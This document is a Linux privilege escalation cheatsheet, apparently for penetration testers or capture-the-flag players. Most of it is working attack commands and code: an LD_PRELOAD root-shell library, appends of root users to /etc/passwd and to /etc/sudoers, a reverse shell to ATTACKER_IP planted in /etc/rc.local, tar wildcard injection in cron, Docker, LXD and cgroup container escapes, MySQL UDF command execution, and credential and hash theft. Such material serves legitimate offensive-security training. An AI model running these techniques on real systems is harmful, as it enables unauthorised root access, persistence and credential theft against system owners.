    Linux Privilege Escalation Cheatsheet

    A comprehensive guide for Linux privilege escalation, covering enumeration and exploitation techniques ordered by priority.

    Quick Start

    Always start with sections 1-3 for the highest probability of success. Kernel exploits should be your last resort!

    1. Initial Enumeration & System Info

    Start Here

    Begin every engagement with these enumeration steps to understand your environment.

    TTY Shell Upgrade

    python3 -c 'import pty;pty.spawn("/bin/bash")'
# Press CTRL + Z
stty raw -echo
fg
export TERM=xterm

    python -c 'import pty;pty.spawn("/bin/bash")'
# Press CTRL + Z
stty raw -echo
fg
export TERM=xterm

    script /dev/null -c bash
# Press CTRL + Z
stty raw -echo
fg
export TERM=xterm

    Basic Information

    # Who am I?
whoami
id

# System Information
uname -a                    # Kernel, architecture
cat /proc/version          # Kernel, gcc version
cat /etc/*-release         # Distro info
lsb_release -a
hostname

# Sudo privileges
sudo -l

# Environment Variables
env
echo $PATH                 # Look for non-standard paths like '.'

    2. Password Hunting & Credential Discovery

    Quick Wins

    This section often provides the fastest path to privilege escalation. Always check thoroughly!

    Filesystem Searching

    find / -name "*passw*" 2>/dev/null
find / -name "*config*" 2>/dev/null
locate 'passw'

    # Run in specific directories: /var/www, /opt, /home
grep --color=auto -rnw . -iIe "PASSW\|PASSWD\|PASSWORD\|PWD" 2>/dev/null

    find / -name "id_rsa" 2>/dev/null
find / -name "id_dsa" 2>/dev/null
find / -name "authorized_keys" 2>/dev/null

    Common Locations

    Location What to Check Example Files
    /var/www/ Database credentials config.php, wp-config.php
    ~/.bash_history Command history All users' history
    ~/.ssh/ Private keys id_rsa, id_dsa
    /var/backups Backup files shadow.bak, passwd.bak
    /opt Application configs *.conf, *.ini
    /tmp Temporary files Various 
    # Check all user bash history
cat /home/*/.bash_history

# Check root-owned files
find / -user root -readable 2>/dev/null

    Cracking Hashes & Protected Files

    Identify First

    Always identify the hash type before attempting to crack it.

    Identify Hash Type:

    hash-identifier
hashid <hash>

    Shadow Hashes ($6$)

    # Combine files
unshadow passwd shadow > unshadowed.txt

# Crack
john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt

# Show cracked
john --show unshadowed.txt

    # Extract hash
hashcat -m 1800 <hash_file> /usr/share/wordlists/rockyou.txt

    Other Hash Types

    Hash Type Hashcat Mode John Format Example Command
    WebDAV ($apr1$) 1600 md5crypt hashcat -m 1600 hash.txt rockyou.txt
    MySQL 300 mysql hashcat -m 300 hash.txt rockyou.txt
    SHA-512 1800 sha512crypt hashcat -m 1800 hash.txt rockyou.txt
    MD5 0 raw-md5 hashcat -m 0 hash.txt rockyou.txt

    Protected Files

    ssh2john id_rsa > id_rsa.hash
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash

    rar2john file.rar > file.hash
john --wordlist=/usr/share/wordlists/rockyou.txt file.hash

    zip2john file.zip > file.hash
john --wordlist=/usr/share/wordlists/rockyou.txt file.hash

    echo 'encoded_string' | base64 --decode

    Database Enumeration

    # Log in
mysql -u <user> -p

# Check for credentials
SELECT user,authentication_string FROM mysql.user;

# Show databases
SHOW DATABASES;

    # Log in
psql -U <user> -h localhost

# List databases
\l

# List users
\du

    3. Sudo, SUID, SGID & Capabilities

    Common Misconfigurations

    These techniques have a high success rate. Always enumerate thoroughly!

    Sudo Abuse

    sudo -l

    Check For

    • LD_PRELOAD - if env_keep+=LD_PRELOAD is present
    • Vulnerable sudo versions (check sudo --version)
    • Commands listed that can be abused via GTFOBins

    Notable CVEs

    CVE Version Affected Description
    CVE-2019-14287 < 1.8.28 Bypass !root restrictions with -u#-1
    CVE-2023-22809 1.8.0 - 1.9.12p1 sudoedit vulnerability
    CVE-2021-3156 1.8.2 - 1.8.31p2, 1.9.0 - 1.9.5p1 Heap-based buffer overflow (Baron Samedit)

    LD_PRELOAD Exploitation

    #include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}

    gcc -fPIC -shared -o preload.so preload.c -nostartfiles
sudo LD_PRELOAD=/tmp/preload.so <allowed_command>

    SUID/SGID Enumeration

    find / -type f -perm -u=s 2>/dev/null

    find / -type f -perm -g=s 2>/dev/null

    find / -type f \( -perm -u=s -o -perm -g=s \) 2>/dev/null

    SUID/SGID Exploitation

    GTFOBins

    Always check GTFOBins for exploitation techniques on standard binaries!

    Standard Binaries to Look For:

    • find, vim, nano, less, more
    • python, perl, ruby, php
    • nmap, tcpdump, wireshark
    • docker, lxc

    Custom Binaries - Check for:

    Shared Object Injection 
    # Check for missing libraries
strace /path/to/binary 2>&1 | grep -i "no such file"
ldd /path/to/binary
    PATH Injection 
    # Check if binary uses relative paths
strings /path/to/binary | grep -E "^[a-z]"
    Shell Features (Bash < 4.2-048) 
    # Function export exploit
function /usr/sbin/service { /bin/bash -p; }
export -f /usr/sbin/service
/path/to/vulnerable/binary

    Capabilities

    Linux Capabilities

    Capabilities allow processes to have specific privileges without full root access.

    Enumeration:

    getcap -r / 2>/dev/null

    Common Exploitable Capabilities:

    /path/to/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

    # Set SUID on bash
/path/to/python3 -c 'import os;os.chmod("/bin/bash", 0o4755)'
/bin/bash -p

    # Write to /etc/passwd
/path/to/python3 -c 'import os;f=open("/etc/passwd","a");f.write("hacker:$(openssl passwd password):0:0:root:/root:/bin/bash\n")'

    # Read /etc/shadow
/path/to/python3 -c 'print(open("/etc/shadow").read())'
    Capability Function Exploitation Method
    cap_setuid Change UID Spawn root shell
    cap_setgid Change GID Spawn root shell
    cap_fowner Bypass file permission checks Make bash SUID
    cap_dac_override Bypass read/write/execute checks Write to /etc/passwd
    cap_dac_read_search Bypass read permission checks Read /etc/shadow
    cap_chown Change file ownership Take ownership of files

    4. Weak File Permissions

    Critical Files

    Focus on /etc/passwd, /etc/shadow, /etc/sudoers, and /root directory.

    General Enumeration

    find / -user $(whoami) -type f 2>/dev/null

    find / -perm -o+w -type f 2>/dev/null
find / -perm -o+w -type d 2>/dev/null

    find / -perm -g+w -type f 2>/dev/null

    Exploiting Readable Sensitive Files

    If readable:

    See section 2: "Cracking Hashes & Protected Files"

    cat /etc/shadow
# Extract hash and crack it

    # Look for SSH keys
ls -la /root/.ssh/
cat /root/.ssh/id_rsa

# Look for credentials
cat /root/.bash_history
find /root -name "*passw*" 2>/dev/null

    ls -la /var/backups/
cat /var/backups/passwd.bak
cat /var/backups/shadow.bak

    Exploiting Writable Sensitive Files

    # Generate password hash
openssl passwd mypassword

# Append new root user
echo 'newroot:$1$xyz$abc123...:0:0:root:/root:/bin/bash' >> /etc/passwd

# Or replace root's password field with generated hash

# Log in
su newroot

    # Generate password hash
mkpasswd -m sha-512 mypassword

# Edit /etc/shadow and replace root's hash
# Or add new user with UID 0

    # Grant passwordless sudo
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers

# Escalate
sudo su -

    # Find writable startup scripts
find /etc -writable 2>/dev/null

# Add reverse shell to writable script
echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' >> /etc/rc.local

    5. Cron Job Exploitation

    Scheduled Tasks

    Cron jobs run with the privileges of the user who scheduled them. Root cron jobs are gold!

    Enumeration

    # System-wide crontab
cat /etc/crontab

# Cron directories
ls -la /etc/cron.d/
ls -la /etc/cron.daily/
ls -la /etc/cron.hourly/
ls -la /etc/cron.monthly/
ls -la /etc/cron.weekly/

# User crontabs
cat /var/spool/cron/crontabs/*

# Systemd timers
systemctl list-timers

    Exploitation Techniques

    Vulnerable Example: 

    * * * * * root backup.sh

    Exploitation: 

    # Create malicious script in writable PATH directory
echo '#!/bin/bash' > /tmp/backup.sh
echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' >> /tmp/backup.sh
chmod +x /tmp/backup.sh

# Modify cron job's PATH if possible


    # If cron script is writable
echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' >> /path/to/script.sh

# Wait for cron to run, then execute
/tmp/rootbash -p

    Vulnerable Example: 

    * * * * * root tar -czf /backup/backup.tar.gz *

    Exploitation: 

    cd /target/directory
echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' > shell.sh
chmod +x shell.sh
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh shell.sh'

    6. Container Breakouts

    Container Escapes

    Being in the docker or lxd group is essentially root access on the host system!

    LXD Container Breakout

    Understanding: The lxd group has permissions equivalent to root.

    Enumeration:

    grep 'lxd' /etc/group
id

    Exploitation (Alpine Image Method):

    # Build Alpine image
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder
sudo ./build-alpine

# Transfer to target (e.g., using Python HTTP server)
python3 -m http.server 8000

    # Download image
wget http://ATTACKER_IP:8000/alpine-v3.13-x86_64-20210218_0139.tar.gz

# Import image
lxc image import ./alpine-v3.13-x86_64-20210218_0139.tar.gz --alias myimage

# Create container with security.privileged=true
lxc init myimage ignite -c security.privileged=true

# Mount host filesystem
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true

# Start container
lxc start ignite

# Execute shell
lxc exec ignite /bin/sh

# Access host filesystem
cd /mnt/root

    Docker Breakout

    Understanding: Being in the docker group allows you to spawn containers with host filesystem access.

    Enumeration:

    id
groups

    # Check if privileged
fdisk -l

# Check capabilities
capsh --print
cat /proc/self/status | grep Cap

    Exploitation Techniques:

    # Mount host root and get shell
docker run -v /:/mnt --rm -it alpine chroot /mnt sh

# Or with existing image
docker run -v /:/mnt --rm -it ubuntu chroot /mnt bash

# You now have root access to host filesystem

    # List block devices
fdisk -l

# Mount host partition (e.g., /dev/sda1)
mkdir /mnt/host
mount /dev/sda1 /mnt/host

# Add SSH key to root
cat /root/.ssh/id_rsa.pub >> /mnt/host/root/.ssh/authorized_keys

    # Create cgroup
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp
mkdir /tmp/cgrp/x

# Enable notifications
echo 1 > /tmp/cgrp/x/notify_on_release

# Get path on host
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`

# Create release agent
echo "$host_path/cmd" > /tmp/cgrp/release_agent

# Create command to execute
echo '#!/bin/sh' > /cmd
echo 'cat /etc/shadow > /output' >> /cmd
chmod a+x /cmd

# Trigger execution
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

    7. Service-Specific Exploitation

    MySQL UDF Exploitation

    Requirements

    • MySQL running as root
    • Superuser credentials found
    • secure_file_priv is null or has write access
    • gcc is present on system

    Enumeration:

    ps -ef | grep mysql
ps aux | grep mysql

    -- Log in
mysql -u root -p

-- Check privileges
SHOW GRANTS;

-- Check secure_file_priv
SHOW VARIABLES LIKE 'SECURE_FILE_PRIV';

-- Check plugin directory
SHOW VARIABLES LIKE 'plugin_dir';

    Exploitation:

    # Download exploit
searchsploit -m 1518

# Compile
gcc -g -c raptor_udf2.c -fPIC
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc

    -- Create table for binary
USE mysql;
CREATE TABLE foo(line BLOB);

-- Insert compiled library
INSERT INTO foo VALUES(LOAD_FILE('/tmp/raptor_udf2.so'));

-- Write to plugin directory
SELECT * FROM foo INTO DUMPFILE '/usr/lib/mysql/plugin/raptor_udf2.so';

-- Create function
CREATE FUNCTION do_system RETURNS INTEGER SONAME 'raptor_udf2.so';

-- Execute commands as root
SELECT do_system('cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash');

    NFS Share Exploitation

    Key Setting

    The no_root_squash option allows remote root users to maintain root privileges.

    Enumeration:

    cat /etc/exports
showmount -e localhost

    showmount -e TARGET_IP
nmap -p 111,2049 TARGET_IP

    Exploitation (no_root_squash):

    # Mount the share
mkdir /tmp/nfs
mount -o rw,vers=3 TARGET_IP:/share /tmp/nfs

# Create SUID bash
cp /bin/bash /tmp/nfs/rootbash
chmod +s /tmp/nfs/rootbash

    # Execute the SUID bash
/share/rootbash -p

# You now have root shell

    # If NFS only accessible internally
ssh -L 2049:localhost:2049 user@TARGET_IP

# Then mount from localhost
mount -o rw,vers=3 localhost:/share /tmp/nfs

    8. Kernel Exploits

    Last Resort

    Kernel exploits can crash the system and should only be used when all other methods fail!

    Enumeration

    Find Kernel Version:

    uname -a
cat /proc/version
cat /etc/issue

    Find Exploits:

    searchsploit linux kernel 5.13
searchsploit -m <exploit_id>

    # Linux Exploit Suggester
./linux-exploit-suggester.sh

# LinPEAS
./linpeas.sh

# Linux Smart Enumeration
./lse.sh

    Compilation & Execution

    Always Read the Source

    Check the first 50 lines of any exploit for compilation instructions and requirements!

    # Check for compiler
gcc --version
g++ --version

# Read exploit instructions
head -50 exploit.c
cat exploit.c | grep -i usage
cat exploit.c | grep -i compile

# Basic compilation
gcc exploit.c -o exploit

# With flags (example for DirtyCow2)
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o exploit exploit.cc -lutil

# Execute
chmod +x exploit
./exploit

    Prioritized Checklist

    Follow This Order

    Work through these phases systematically for the best results.

    Phase 1: Initial Foothold & Basic Enumeration

    • [ ] Upgraded to full TTY shell
    • [ ] Checked current user, ID, and groups (whoami, id)
    • [ ] Gathered system information (uname -a, cat /etc/*-release)
    • [ ] Reviewed .bash_history and other history files
    • [ ] Inspected environment variables (env, echo $PATH)
    • [ ] Checked sudo version (sudo --version)

    Phase 2: Quick Wins & Common Vectors

    • [ ] Ran sudo -l to check sudo privileges
    • [ ] Searched filesystem for passwords, hashes, and keys
    • [ ] Checked common config locations (/var/www, /opt, /home)
    • [ ] Looked for SSH private keys in ~/.ssh/ directories
    • [ ] Checked /var/backups for sensitive backup files
    • [ ] Attempted to crack any discovered hashes or protected files
    • [ ] Checked for database credentials in web configs

    Phase 3: File System & Permissions

    • [ ] Enumerated SUID binaries (find / -perm -u=s 2>/dev/null)
    • [ ] Enumerated SGID binaries (find / -perm -g=s 2>/dev/null)
    • [ ] Checked GTFOBins for exploitation of standard SUID/SGID binaries
    • [ ] Tested read access to /etc/shadow
    • [ ] Tested write access to /etc/passwd
    • [ ] Tested write access to /etc/sudoers
    • [ ] Tested read access to /root directory
    • [ ] Found world-writable files and directories
    • [ ] Checked for extended capabilities (getcap -r /)

    Phase 4: Deeper System Enumeration

    • [ ] Analyzed cron jobs (/etc/crontab, /etc/cron.*)
    • [ ] Checked for writable cron scripts
    • [ ] Looked for PATH injection in cron jobs
    • [ ] Analyzed custom SUID/SGID binaries for vulnerabilities
    • [ ] Checked for shared object injection in custom binaries
    • [ ] Checked for PATH injection in custom binaries
    • [ ] Analyzed file capabilities for exploitable privileges
    • [ ] Checked for LD_PRELOAD vulnerability in sudo
    • [ ] Looked for sudo token reuse opportunities

    Phase 5: Environment & Services

    • [ ] Checked if user is in docker group
    • [ ] Checked if user is in lxd group
    • [ ] Analyzed container configurations (if in container)
    • [ ] Checked for privileged container (fdisk -l)
    • [ ] Checked for CAP_SYS_ADMIN capability
    • [ ] Enumerated NFS shares (showmount -e)
    • [ ] Checked /etc/exports for no_root_squash
    • [ ] Checked if MySQL is running as root (ps aux | grep mysql)
    • [ ] Looked for MySQL credentials in config files
    • [ ] Checked MySQL secure_file_priv setting
    • [ ] Listed all running processes with high privileges
    • [ ] Enumerated all running services (systemctl list-units)
    • [ ] Listed installed packages and checked for vulnerable versions

    Phase 6: Last Resorts

    • [ ] Identified exact kernel version (uname -a)
    • [ ] Searched for known kernel exploits (searchsploit, linux-exploit-suggester)
    • [ ] Checked for gcc or other compilers on the system
    • [ ] Read exploit source code for compilation requirements
    • [ ] Compiled and tested kernel exploit (with caution)

sudo -l

find / -type f -perm -u=s 2>/dev/null

# Password Hunting
find / -name "*passw*" 2>/dev/null
grep -rnw /var/www /opt /home -iIe "PASSW" 2>/dev/null

# Cron Jobs
cat /etc/crontab && ls -la /etc/cron.*

# Groups
id
grep -E 'docker|lxd' /etc/group

# Network
cat /etc/exports
netstat -tulpn
